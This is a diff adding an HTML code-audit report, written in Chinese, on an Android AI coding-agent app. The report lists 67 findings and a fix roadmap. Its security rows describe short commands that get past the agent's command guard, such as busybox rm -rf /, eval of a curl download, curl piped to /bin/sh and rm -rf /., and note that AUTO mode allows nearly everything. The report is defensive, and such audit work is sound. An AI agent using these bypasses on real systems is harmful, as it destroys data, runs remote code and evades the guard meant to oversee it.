+<li><b>PLAN 只读在策略层物理强制</b>（<span class="path">ToolPermissionPolicyEngine.kt:106-108</span>），不寄望模型自觉；PLAN→BUILD 走计划审查面板、拒绝回灌 MODE_SWITCH_REJECTED。</li>
+<li><b>凭据双层加密</b>：Keystore AES-256-GCM MasterKey → 随机 DEK（仅内存）→ 业务数据 GCM，备份规则主动排除密文库。</li>
+<li><b>SSH 真 TOFU</b>：known_hosts + 密钥变更即抛 HostKeyChangedException，而非接受任意主机。</li>
+<li><b>newui token 流水线</b>：Style Dictionary + DTCG + Gradle 任务 + CI git diff 对账门禁，库内 0 硬编码色值，是工程化最好模块。</li>
+<li><b>bundle 安装真断点续传 / apk exit=2 自愈 / zip-slip 防护 / ETXTBSY 四层保护</b>，真实踩坑均有注释。</li>
+<li><b>CI 工程化</b>：6 个 workflow、OSV 漏洞周扫、versionCode 单调性校验、applicationId 白名单三重防线。</li>
+<li><b>零 GlobalScope、SSH/PTY 资源释放 runCatching 兜底、无遥测/崩溃上报 SDK</b>（隐私友好）。</li>
+<li><b>R8 规则精细</b>：针对 Retrofit/Gson/kotlinx/BouncyCastle/Termux JNI 精确保留，注释记录踩坑。</li>
+</ul>
+<p class="sub">主要设计取舍：targetSdk=28（PRoot 必要）、AUTO 近乎全放行（自动化优先）、终端会话仅内存（后台保活优先）、apk 源 http（apk 签名兜底）、prompt 外置按 mode/order 组装（KV-cache 友好）。</p>
+</div>
+
+<!-- ============ ⑨ 总表 ============ -->
+<h2 class="sec" id="master">⑨ 问题清单总表（可按严重度筛选）</h2>
+<div class="filters" id="filters">
+  <button data-f="all" class="on">全部 (67)</button>
+  <button data-f="critical">严重 (1)</button>
+  <button data-f="high">高 (12)</button>
+  <button data-f="mid">中 (30)</button>
+  <button data-f="low">低 (21)</button>
+  <button data-f="tip">提示 (3)</button>
+</div>
+<table id="masterTable">
+<thead><tr><th style="width:78px">编号</th><th>标题</th><th style="width:64px">严重度</th><th style="width:90px">层/模块</th><th style="width:200px">文件:行号</th><th>影响</th><th>修复建议</th></tr></thead>
+<tbody>
+<tr data-sev="critical"><td>BLD-01</td><td>Release 签名密钥+明文密码入库</td><td><span class="badge b-critical">严重</span></td><td>app/签名</td><td class="path">app/minime.jks; app/keystore.properties</td><td>任何人可签发冒充官方的 APK</td><td>移至 CI Secrets，git 历史清除，重新生成密钥</td></tr>
+<tr data-sev="high"><td>ARC-01</td><td>core↔feature 包级循环依赖</td><td><span class="badge b-high">高</span></td><td>架构边界</td><td class="path">core/security/CredentialEncryptor.kt:7 ↔ feature/workspace/domain/repository/RemoteRepository.kt:3</td><td>分层破坏、core 不可独立复用</td><td>抽象下沉 core，workspace 实现注入</td></tr>
+<tr data-sev="high"><td>ARC-05</td><td>SchemaSelfHealer 仅自愈 2/27 表</td><td><span class="badge b-high">高</span></td><td>migration</td><td class="path">datalayer/migration/SchemaSelfHealer.kt:30-82; DataLayerModule.kt:131</td><td>其余表漂移仍首查即崩</td><td>泛化遍历 .sq 表做列对账</td></tr>
+<tr data-sev="high"><td>ARC-10</td><td>文档谎称 SQLCipher 已启用，实际明文</td><td><span class="badge b-high">高</span></td><td>文档 vs 代码</td><td class="path">README.md:150; AGENTS.md:48,237; CipherDriverFactory.kt:22</td><td>对外安全能力不实陈述</td><td>文档改为“预留接缝+字段级加密”</td></tr>
+<tr data-sev="high"><td>ARC-11</td><td>英文 README 仍写旧 Room 架构</td><td><span class="badge b-high">高</span></td><td>文档</td><td class="path">README.en.md:150</td><td>英文用户被误导</td><td>同步为 SQLDelight 6 库</td></tr>
+<tr data-sev="high"><td>AGT-01</td><td>OpenAI 流式并行工具调用 index≥2 静默丢弃</td><td><span class="badge b-high">高</span></td><td>LLM 流式</td><td class="path">OpenAIAdapter.kt:36-52</td><td>≥3 并行调用第 3+ 个被吞，模型误判已执行</td><td>subscript 提到 8~16 或动态注册路径</td></tr>
+<tr data-sev="high"><td>AGT-02</td><td>“首 token 后不重试”未接线</td><td><span class="badge b-high">高</span></td><td>LLM 流式</td><td class="path">RetryPolicy.kt:219-222; OpenAIAdapter.kt:344</td><td>流中途掉线从头重发致正文重复</td><td>attemptOnce 回传 produced 标志</td></tr>
+<tr data-sev="high"><td>SEC-01</td><td>busybox rm -rf / 绕过灾难性 rm</td><td><span class="badge b-high">高</span></td><td>权限引擎</td><td class="path">ShellCommandParser.kt:162</td><td>AUTO 下 busybox 整盘删除不被拦截</td><td>识别 busybox/exec 前缀 + basename 归一</td></tr>
+<tr data-sev="high"><td>SEC-02</td><td>eval "$(curl URL)" 远程脚本执行</td><td><span class="badge b-high">高</span></td><td>权限引擎</td><td class="path">ToolPermissionPolicyEngine.kt:112-126</td><td>AUTO 不看 analyzable，下载执行全放行</td><td>AUTO 对 curl/wget/eval/$() 段强制 BLOCK</td></tr>
+<tr data-sev="high"><td>TML-01</td><td>resetContainer 不杀活进程即删 rootfs</td><td><span class="badge b-high">高</span></td><td>容器生命周期</td><td class="path">LinuxContainerEngine.kt:905-931</td><td>僵尸容器进程 + rootfs 一致性破坏</td><td>删目录前进程组级终止并 join</td></tr>
+<tr data-sev="high"><td>TML-02</td><td>全程只杀直接子进程、无进程组终止</td><td><span class="badge b-high">高</span></td><td>容器/PTY/MCP</td><td class="path">SubprocessBackend.java:65-71; LinuxContainerEngine.kt:259; StdioTransport.kt:109</td><td>后台派生进程孤儿化泄漏</td><td>close/destroy 改发负 pid SIGKILL</td></tr>
+<tr data-sev="high"><td>BLD-02</td><td>无 version catalog</td><td><span class="badge b-high">高</span></td><td>构建系统</td><td class="path">gradle/ (无 toml)</td><td>依赖版本内联、多模块易不一致</td><td>创建 libs.versions.toml</td></tr>
+<tr data-sev="high"><td>BLD-03</td><td>Termux 派生代码无版权头</td><td><span class="badge b-high">高</span></td><td>合规</td><td class="path">terminal-emulator/.../*.java:1</td><td>GPL 归属不完整</td><td>加原始版权声明 + THIRD-PARTY-NOTICES</td></tr>
+
+<tr data-sev="mid"><td>ARC-02</td><td>domain 直连 datalayer.repository</td><td><span class="badge b-mid">中</span></td><td>Clean Arch</td><td class="path">feature/agent/domain/session/SessionUseCase.kt:4（23 文件）</td><td>domain 与 SQLDelight 耦合</td><td>domain 依赖抽象、feature/data 委托</td></tr>
+<tr data-sev="mid"><td>ARC-04</td><td>CodeMigration 死代码、从未接线</td><td><span class="badge b-mid">中</span></td><td>migration</td><td class="path">datalayer/migration/CodeMigration.kt:12; DataLayerModule.kt:165</td><td>数据转换迁移通道形同虚设</td><td>接线或删除参数</td></tr>
+<tr data-sev="mid"><td>ARC-06</td><td>自愈硬编码 DDL 与 .sq 双份真相</td><td><span class="badge b-mid">中</span></td><td>migration</td><td class="path">SchemaSelfHealer.kt:42-73</td><td>改列易引入新漂移</td><td>从生成 schema 元数据读列</td></tr>
+<tr data-sev="mid"><td>ARC-08</td><td>BackupManager 三向映射冗余中转</td><td><span class="badge b-mid">中</span></td><td>backup</td><td class="path">feature/backup/data/BackupManagerImpl.kt:865-918</td><td>schema 加列要改三处</td><td>收敛为 V2↔Dto</td></tr>
+<tr data-sev="mid"><td>ARC-09</td><td>AgentRepository god-class（926 行/225 fun）</td><td><span class="badge b-mid">中</span></td><td>repository</td><td class="path">datalayer/repository/AgentRepository.kt:22</td><td>变更面大、难拆测</td><td>按子域拆仓储</td></tr>
+<tr data-sev="mid"><td>ARC-12</td><td>文档指向不存在文件</td><td><span class="badge b-mid">中</span></td><td>文档</td><td class="path">README.md:165; AGENTS.md:189,245,273</td><td>按文档找不到实现</td><td>修正/删除路径</td></tr>
+<tr data-sev="mid"><td>AGT-03</td><td>workflow 无统一工具超时</td><td><span class="badge b-mid">中</span></td><td>状态机/工具</td><td class="path">StatefulAgentWorkflow.kt:1190; ExecuteCommandTool.kt:60; BrowserAgentTool.kt:446</td><td>超长工具阻塞，仅靠用户取消</td><td>workflow 加硬顶 + 浏览器 timeout 钳制</td></tr>
+<tr data-sev="mid"><td>AGT-04</td><td>PLAN 只读依赖工具声明 capabilities</td><td><span class="badge b-mid">中</span></td><td>三模式</td><td class="path">ToolPermissionPolicyEngine.kt:137-163</td><td>漏声明的写工具 PLAN 不拦</td><td>新增写工具能力做启动期校验</td></tr>
+<tr data-sev="mid"><td>AGT-05</td><td>无入参运行时 required/type 校验</td><td><span class="badge b-mid">中</span></td><td>工具系统</td><td class="path">AgentTool.kt:162; StatefulAgentWorkflow.kt:1721</td><td>幻觉参数只报通用失败</td><td>pre-execute 加 schema 校验</td></tr>
+<tr data-sev="mid"><td>AGT-06</td><td>executeEvents 单函数约 800 行</td><td><span class="badge b-mid">中</span></td><td>God Object</td><td class="path">StatefulAgentWorkflow.kt:585-1394</td><td>修改面过大、回归风险高</td><td>抽 vision/autoTrigger/落库协作者</td></tr>
+<tr data-sev="mid"><td>AGT-07</td><td>BrowserController god-class（2110 行）</td><td><span class="badge b-mid">中</span></td><td>God Object</td><td class="path">feature/browser/domain/BrowserController.kt</td><td>单点改动波及广</td><td>拆 Tab/Download/Snapshot/Navigation</td></tr>
+<tr data-sev="mid"><td>AGT-08</td><td>AIAgentViewModel god-class（1995 行）</td><td><span class="badge b-mid">中</span></td><td>God Object</td><td class="path">feature/agent/presentation/AIAgentViewModel.kt</td><td>职责过载</td><td>拆会话/权限/流式 reducer</td></tr>
+<tr data-sev="mid"><td>SEC-03</td><td>curl|/bin/sh 绕过 B1 管道拦截</td><td><span class="badge b-mid">中</span></td><td>权限引擎</td><td class="path">DangerousCommandGuard.kt:191</td><td>下载+执行绝对路径/busybox 前缀漏拦</td><td>basename 归一 + 补 &&/; 串联规则</td></tr>
+<tr data-sev="mid"><td>SEC-04</td><td>rm -rf /. 绕过根目录删除判定</td><td><span class="badge b-mid">中</span></td><td>权限引擎</td><td class="path">ToolPermissionPolicyEngine.kt:204</td><td>字符串精确比较未做路径归一</td><td>判定前 canonicalize</td></tr>
+<tr data-sev="mid"><td>SEC-05</td><td>base64/反shell/dot-source 仅 Warn</td><td><span class="badge b-mid">中</span></td><td>权限引擎</td><td class="path">DangerousCommandGuard.kt:280,289</td><td>AUTO 下高危动作只提示不阻断</td><td>纳入 Block</td></tr>
+<tr data-sev="mid"><td>SEC-06</td><td>git token 明文落盘</td><td><span class="badge b-mid">中</span></td><td>凭据</td><td class="path">GitCredentialsFileSync.kt:62-67</td><td>root/adb 可直读 PAT</td><td>收紧权限并文档化，短凭据</td></tr>
+<tr data-sev="mid"><td>SEC-07</td><td>agent 命令全文写公共外部日志</td><td><span class="badge b-mid">中</span></td><td>凭据/日志</td><td class="path">FileLogger.kt:35; LinuxContainerEngine.kt:249</td><td>内嵌 token/密码进 Documents</td><td>落盘前掩码 + 默认级别降 INFO</td></tr>
+<tr data-sev="mid"><td>SEC-08</td><td>全局 cleartextTrafficPermitted</td><td><span class="badge b-mid">中</span></td><td>网络</td><td class="path">res/xml/network_security_config.xml</td><td>http 端点 API key 明文传输</td><td>仅对显式 http 域名放行</td></tr>
+<tr data-sev="mid"><td>TML-03</td><td>MCP close 只 destroy 不强杀</td><td><span class="badge b-mid">中</span></td><td>MCP</td><td class="path">StdioTransport.kt:103-110</td><td>卡系统调用的 server 不退出</td><td>destroy 后超时兜底强杀</td></tr>
+<tr data-sev="mid"><td>TML-04</td><td>终端会话仅内存、无跨进程恢复</td><td><span class="badge b-mid">中</span></td><td>终端后台</td><td class="path">TerminalSessionManager.kt:33; KeepaliveService.kt:31</td><td>进程被杀后标签全丢</td><td>会话元数据持久化</td></tr>
+<tr data-sev="mid"><td>TML-08</td><td>bundle 卸载不看退出码</td><td><span class="badge b-mid">中</span></td><td>bundle 安装</td><td class="path">LinuxContainerEngine.kt:642,675</td><td>状态与实际可能不一致</td><td>卸载后重扫 apk world</td></tr>
+<tr data-sev="mid"><td>TML-10</td><td>预编译 .so 无源码/上游锚点</td><td><span class="badge b-mid">中</span></td><td>native</td><td class="path">terminal-emulator/.../JNI.java:8; jniLibs 四 ABI</td><td>不可复现、供应链可审计性缺口</td><td>记录上游 commit 或纳入源码</td></tr>
+<tr data-sev="mid"><td>TML-12</td><td>newui 未真正接管 app 主题</td><td><span class="badge b-mid">中</span></td><td>newui 解耦</td><td class="path">MainActivity.kt:197; app 内 400 处 Color(0x)</td><td>多套设计系统并存</td><td>宿主切 AppTheme()、收敛硬编码色值</td></tr>
+<tr data-sev="mid"><td>BLD-04</td><td>jitpack.io 供应链入口</td><td><span class="badge b-mid">中</span></td><td>构建系统</td><td class="path">settings.gradle.kts:8,40</td><td>不可复现构建</td><td>无外部依赖则移除</td></tr>
+<tr data-sev="mid"><td>BLD-05</td><td>仓库无 git tag</td><td><span class="badge b-mid">中</span></td><td>版本号</td><td class="path">app/build.gradle.kts:46-67</td><td>versionName 始终 dev</td><td>打首个正式 tag</td></tr>
+<tr data-sev="mid"><td>BLD-06</td><td>无 third-party NOTICE</td><td><span class="badge b-mid">中</span></td><td>合规</td><td class="path">(无 NOTICE 文件)</td><td>Apache-2.0 依赖缺 NOTICE</td><td>生成 THIRD-PARTY-NOTICES</td></tr>
+<tr data-sev="mid"><td>BLD-07</td><td>二进制资产无来源说明</td><td><span class="badge b-mid">中</span></td><td>合规</td><td class="path">app/src/_armAssets/container/</td><td>proot/qemu/rootfs 归属不明</td><td>加 README 说明来源与许可</td></tr>
+<tr data-sev="mid"><td>BLD-08</td><td>无隐私政策文档</td><td><span class="badge b-mid">中</span></td><td>隐私</td><td class="path">(无隐私政策)</td><td>数据流向未告知用户</td><td>创建隐私政策</td></tr>
+<tr data-sev="mid"><td>BLD-09</td><td>runBlocking 同步桥接 3 处</td><td><span class="badge b-mid">中</span></td><td>并发</td><td class="path">RemoteSshConnection.kt:186; SkillStateRepository.kt:57; RemoteSftpFileAccess.kt:79</td><td>主线程调用可能阻塞 UI</td><td>标注线程要求，迁移 suspend</td></tr>
+<tr data-sev="mid"><td>BLD-12</td><td>targetSdk 锁定 28</td><td><span class="badge b-mid">中</span></td><td>构建系统</td><td class="path">app/build.gradle.kts:151</td><td>安全 API 改进不可用</td><td>已知取舍（PRoot 必要）</td></tr>
+
+<tr data-sev="low"><td>ARC-03</td><td>presentation 直连 SQLDelight 生成类</td><td><span class="badge b-low">低</span></td><td>边界</td><td class="path">AIAgentViewModel.kt:9-12</td><td>UI 随 schema 漂移</td><td>经 UI model 中转</td></tr>
+<tr data-sev="low"><td>ARC-13</td><td>生成包名 me_core vs mec 不一致</td><td><span class="badge b-low">低</span></td><td>文档</td><td class="path">AGENTS.md:241 vs build.gradle.kts:462</td><td>复制 import 出错</td><td>文档统一 com.mini.mecore</td></tr>
+<tr data-sev="low"><td>ARC-14</td><td>注释引用不存在的测试</td><td><span class="badge b-low">低</span></td><td>测试</td><td class="path">app/build.gradle.kts testOptions</td><td>schema 漂移无门禁</td><td>补测试或删注释</td></tr>
+<tr data-sev="low"><td>AGT-09</td><td>压缩失败返回原列表致硬错误</td><td><span class="badge b-low">低</span></td><td>上下文压缩</td><td class="path">ContextCompactor.kt:107-110</td><td>下轮 context_window_exceeded</td><td>失败退化更激进截断</td></tr>
+<tr data-sev="low"><td>AGT-10</td><td>MCP close 软终止、无重连</td><td><span class="badge b-low">低</span></td><td>MCP</td><td class="path">StdioTransport.kt:109; McpManager.kt:127</td><td>不响应 SIGTERM 的 server 残留</td><td>强杀兜底 + 健康检查</td></tr>
+<tr data-sev="low"><td>AGT-11</td><td>sessionSnapshots 只写不清</td><td><span class="badge b-low">低</span></td><td>prompt</td><td class="path">SystemPromptProvider.kt:256</td><td>多会话内存慢增长</td><td>会话删除时 remove</td></tr>
+<tr data-sev="low"><td>AGT-12</td><td>provider 类型靠类名推断</td><td><span class="badge b-low">低</span></td><td>LLM</td><td class="path">ContextCompactor.kt:238-245</td><td>类重命名即失效</td><td>显式 ProviderType 透传</td></tr>
+<tr data-sev="low"><td>AGT-13</td><td>extractFinalContent 死代码</td><td><span class="badge b-low">低</span></td><td>状态机</td><td class="path">StatefulAgentWorkflow.kt:2219</td><td>误导维护者</td><td>删除或接线</td></tr>
+<tr data-sev="low"><td>SEC-09</td><td>桥接 token/代理 secret 非 SecureRandom</td><td><span class="badge b-low">低</span></td><td>桥/代理</td><td class="path">RcbBridge.kt:61; ClashProxyManager.kt:267</td><td>可预测随机数降低门槛</td><td>全部换 SecureRandom</td></tr>
+<tr data-sev="low"><td>SEC-10</td><td>WebView 全开 + 页内跳转不校验 scheme</td><td><span class="badge b-low">低</span></td><td>WebView</td><td class="path">BrowserController.kt:1763-1774</td><td>重定向可访问 file://</td><td>页内跳转过 validateUrl、关混合内容</td></tr>
+<tr data-sev="low"><td>SEC-11</td><td>SSH 首连静默接受主机密钥</td><td><span class="badge b-low">低</span></td><td>SSH</td><td class="path">HostKeyManager.kt:90-101</td><td>首连 MITM 无感知</td><td>首连展示指纹并确认</td></tr>
+<tr data-sev="low"><td>SEC-12</td><td>检查点回滚无符号链接校验</td><td><span class="badge b-low">低</span></td><td>检查点</td><td class="path">CheckpointManager.kt:129,135</td><td>经符号链接写越界</td><td>realpath 校验限工作区</td></tr>
+<tr data-sev="low"><td>TML-05</td><td>屏幕缓冲正则轮询判退出</td><td><span class="badge b-low">低</span></td><td>终端后台</td><td class="path">TerminalSessionManager.kt:467-490</td><td>补偿 proot 不释放 PTY</td><td>接受，注意命令模板 marker</td></tr>
+<tr data-sev="low"><td>TML-06</td><td>startProotProcess 死代码</td><td><span class="badge b-low">低</span></td><td>容器</td><td class="path">LinuxContainerEngine.kt:1216</td><td>维护误导</td><td>删除或补调用方</td></tr>
+<tr data-sev="low"><td>TML-07</td><td>删 rootfs 无停容器前置</td><td><span class="badge b-low">低</span></td><td>容器安装</td><td class="path">ContainerInstaller.kt:325</td><td>与 TML-01 同源</td><td>删目录前停容器</td></tr>
+<tr data-sev="low"><td>TML-09</td><td>apk 源 http、无独立校验和</td><td><span class="badge b-low">低</span></td><td>bundle 安装</td><td class="path">ContainerInstaller.kt:156-161</td><td>完整性依赖 apk 签名</td><td>可接受，文档已说明</td></tr>
+<tr data-sev="low"><td>TML-11</td><td>newui token 命名/KDoc 不一致</td><td><span class="badge b-low">低</span></td><td>newui token</td><td class="path">newui/build.gradle.kts:100; AppTokens.kt:3</td><td>文档漂移</td><td>统一命名</td></tr>
+<tr data-sev="low"><td>BLD-10</td><td>githooks 未默认启用</td><td><span class="badge b-low">低</span></td><td>Git hooks</td><td class="path">.githooks/ (未配置)</td><td>Conventional Commits 校验不生效</td><td>README 提示启用命令</td></tr>
+<tr data-sev="low"><td>BLD-11</td><td>onCleared 未取消 sessionJobs</td><td><span class="badge b-low">低</span></td><td>并发</td><td class="path">AIAgentViewModel.kt:144-148</td><td>可能残留协程</td><td>onCleared 中 cancel jobs</td></tr>
+<tr data-sev="low"><td>BLD-13</td><td>包名下划线</td><td><span class="badge b-low">低</span></td><td>命名</td><td class="path">build.gradle.kts:131</td><td>不符惯例但一致</td><td>低优先级</td></tr>
+<tr data-sev="low"><td>BLD-14</td><td>终端会话故意常驻后台</td><td><span class="badge b-low">低</span></td><td>并发</td><td class="path">TerminalViewModel.kt:448</td><td>内存占用</td><td>提供“关闭全部会话”入口</td></tr>
+
+<tr data-sev="tip"><td>ARC-07</td><td>快照生成但无回滚闭环</td><td><span class="badge b-tip">提示</span></td><td>migration</td><td class="path">DataLayerModule.kt:107-109</td><td>快照备而不用</td><td>补失败看门狗接 restoreSnapshot</td></tr>
+<tr data-sev="tip"><td>ARC-15</td><td>provideAgentDb 与 onOpened 重复跑自愈</td><td><span class="badge b-tip">提示</span></td><td>DI</td><td class="path">DataLayerModule.kt:160-172</td><td>启动重复 PRAGMA</td><td>单处自愈入口</td></tr>
+<tr data-sev="tip"><td>SEC-13</td><td>AUTO 模式默认全放行</td><td><span class="badge b-tip">提示</span></td><td>权限引擎</td><td class="path">ToolPermissionPolicyEngine.kt:110</td><td>上述绕过在 AUTO 下成立</td><td>不可静态判定命令默认 ASK</td></tr>
+</tbody>
+</table>
+
+<!-- ============ ⑩ 路线图 ============ -->
+<h2 class="sec" id="roadmap">⑩ 分优先级整改路线图</h2>
+
+<h3><span class="badge b-critical">P0</span>　立即处置（安全/供应链）</h3>
+<div class="road p0">
+<ul class="tight">
+<li><b>BLD-01</b>：作废并重新生成 Release 签名密钥；minime.jks/keystore.properties 移出 git 历史（git filter-repo），密钥改走 CI Secrets。</li>
+<li><b>SEC-01 / SEC-02 / SEC-03 / SEC-04</b>：修命令护栏——busybox/exec/env/xargs 前缀识别、basename 归一、AUTO 对 curl/wget/eval/$() 与 analyzable=false 默认 BLOCK、根路径 canonicalize。</li>
+<li><b>SEC-07</b>：agent 命令落公共日志前掩码 URL 凭据/Authorization/密码；默认日志级别降到 INFO 以上。</li>
+<li><b>ARC-10</b>：更正 README/AGENTS，明确“明文库 + 字段级 AES-GCM，SQLCipher 为预留接缝”。</li>
+</ul>
+</div>
+
+<h3><span class="badge b-high">P1</span>　近期（1~2 个迭代，正确性与隔离）</h3>
+<div class="road p1">
+<ul class="tight">
+<li><b>AGT-01 / AGT-02</b>：修 OpenAI 流式并行工具调用抽取路径（≥8）；attemptOnce 回传 produced 标志，首 token 后不重试。</li>
+<li><b>TML-01 / TML-02</b>：引入集中进程注册表，reset/删 rootfs 前进程组级终止并 join；PTY/MCP close 改发负 pid SIGKILL + 强杀兜底。</li>
+<li><b>ARC-01</b>：拆分 core↔feature.workspace 循环依赖，抽象下沉 core/datalayer。</li>
+<li><b>ARC-05</b>：SchemaSelfHealer 泛化为遍历 .sq 全部表做列对账（至少补 todo_items/goals/jobs/wake_queue）。</li>
+<li><b>SEC-06</b>：收紧 git-credentials 文件权限并文档化；评估短凭据。</li>
+<li><b>BLD-03 / BLD-06</b>：补 Termux 源文件版权头与 THIRD-PARTY-NOTICES；<b>ARC-11</b> 同步英文 README。</li>
+</ul>
+</div>
+
+<h3><span class="badge b-mid">P2</span>　中期（技术债与工程化）</h3>
+<div class="road p2">
+<ul class="tight">
+<li><b>AGT-06/07/08、ARC-09</b>：拆分三大 God Object（StatefulAgentWorkflow / BrowserController / AIAgentViewModel / AgentRepository）。</li>
+<li><b>ARC-02/03</b>：domain 依赖抽象、presentation 经 UI model 中转，消除直连 datalayer。</li>
+<li><b>BLD-02</b>：建 gradle/libs.versions.toml；<b>BLD-05</b> 打首个正式 tag；<b>BLD-04</b> 清理 jitpack 入口。</li>
+<li><b>TML-10 / TML-12</b>：记录 native .so 上游来源；把 app 主题切到 newui AppTheme()、收敛 400 处硬编码色值。</li>
+<li><b>AGT-03/04/05</b>：workflow 加单工具硬顶、写工具能力启动期校验、入参 schema 运行时校验。</li>
+<li><b>BLD-08 / BLD-07</b>：补隐私政策与二进制资产来源说明；<b>BLD-09/11</b>：runBlocking 线程标注与 sessionJobs 取消。</li>
+</ul>
+</div>
+
+<div class="foot">
+<p><b>审计方法</b>：人工读码 + grep/find/wc 实证扫描（硬编码密钥、http 明文端点、TrustAll、Runtime.exec、敏感日志、GlobalScope、测试用例数等均有计数）；未编译 APK、未真机运行、未做动态分析/渗透测试。</p>
+<p><b>未覆盖项</b>：vendored Termux 代码（com.termux.terminal/view，约 7.6k 行）未逐行审计，仅评估改动面；native .so（libtermux.so 等）未做二进制逆向；WebView/MCP/SSH 未做动态行为验证；assets 二进制资产（rootfs/proot/qemu）未解包审计。</p>
+<p>生成日期：2026-09-19　·　问题总数 67（严重 1 / 高 12 / 中 30 / 低 21 / 提示 3）　·　覆盖 4 个 Gradle 模块 + :app 内 core/datalayer/di/feature（11 feature）。</p>
+</div>
+
+</div>
+<script>
+// 移动端目录开关
+var btn=document.getElementById('menuBtn'),sb=document.getElementById('sidebar');
+btn.addEventListener('click',function(){sb.classList.toggle('open');});
+// 目录点击后收起（移动端）
+sb.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){if(window.innerWidth<=900)sb.classList.remove('open');});});
+// 滚动高亮当前章节
+var links=Array.prototype.slice.call(sb.querySelectorAll('a'));
+var sections=links.map(function(a){var id=a.getAttribute('href').slice(1);return document.getElementById(id);});
+function onScroll(){
+  var y=window.scrollY+120,cur=0;
+  sections.forEach(function(s,i){if(s&&s.offsetTop<=y)cur=i;});
+  links.forEach(function(a,i){a.classList.toggle('active',i===cur);});
+}
+window.addEventListener('scroll',onScroll);onScroll();
+// 严重度筛选
+var fbtns=document.querySelectorAll('#filters button');
+var rows=document.querySelectorAll('#masterTable tbody tr');
+fbtns.forEach(function(b){
+  b.addEventListener('click',function(){
+    fbtns.forEach(function(x){x.classList.remove('on');});
+    b.classList.add('on');
+    var f=b.getAttribute('data-f');
+    rows.forEach(function(r){
+      r.style.display=(f==='all'||r.getAttribute('data-sev')===f)?'':'none';
+    });
+  });
+});
+</script>
+</body>
+</html>
